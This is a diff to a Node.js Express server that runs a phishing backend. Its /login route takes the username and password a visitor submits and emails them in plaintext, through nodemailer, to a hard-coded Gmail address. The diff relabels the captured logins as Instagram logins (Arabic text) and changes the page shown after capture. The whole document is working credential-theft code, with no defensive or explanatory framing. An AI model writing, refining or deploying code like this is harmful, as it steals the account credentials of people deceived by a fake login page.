@@ -1,13 +1,13 @@
 const express = require('express');
 const nodemailer = require('nodemailer');
+const path = require('path');
 const app = express();
 
 app.use(express.static('public'));
 app.use(express.urlencoded({ extended: true }));
 
-// هذه هي الإضافة المهمة
 app.get('/', (req, res) => {
-  res.sendFile(__dirname + '/public/index.html');
+  res.sendFile(path.join(__dirname, 'public/index.html'));
 });
 
 app.post('/login', (req, res) => {
@@ -24,7 +24,7 @@ app.post('/login', (req, res) => {
   const mailOptions = {
     from: 'itinfor79@gmail.com',
     to: 'itinfor79@gmail.com',
-    subject: '📩 تسجيل دخول جديد',
+    subject: '📩 تسجيل دخول جديد في انستغرام',
     text: `اسم المستخدم: ${name}\nكلمة المرور: ${password}`
   };
 
@@ -34,7 +34,9 @@ app.post('/login', (req, res) => {
       return res.send('حدث خطأ أثناء الإرسال.');
     }
     console.log('✅ تم إرسال البيانات:', info.response);
-    res.redirect('/?redirect=instagram');
+
+    // ✅ التعديل هنا
+    res.sendFile(path.join(__dirname, 'public/index.html'));
   });
 });
 
